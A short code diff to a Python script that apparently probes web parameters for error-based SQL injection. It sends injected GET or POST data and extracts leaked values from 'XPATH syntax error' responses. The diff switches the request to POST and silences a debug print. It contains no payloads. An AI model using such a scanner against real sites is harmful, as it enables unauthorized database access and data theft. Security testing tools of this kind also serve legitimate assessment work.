@@ -28,7 +28,7 @@ def verify(vulnurl, postdata):
                 'Referer': vulnurl
     }
     try:
-        r = requests.get(vulnurl, data=postdata, headers=headers, verify=False, timeout=10)
+        r = requests.post(vulnurl, data=postdata, headers=headers, verify=False, timeout=10)
         #print(r.text)
         if "XPATH" in r.text:
             info = re.findall("XPATH syntax error:\s*([^\s]+)", r.text)
@@ -64,7 +64,7 @@ def check(vulnurl, postdata, parm):
             new_vulurl = uri
             if "?" in vulnurl:
                 new_vulurl = uri + "?" + getdata_payload
-            print(new_vulurl, postdata_payload)
+            #print(new_vulurl, postdata_payload)
             info = verify(new_vulurl, postdata_payload)
             if info != "except" and info != "nosql":
                 return info, select_payload
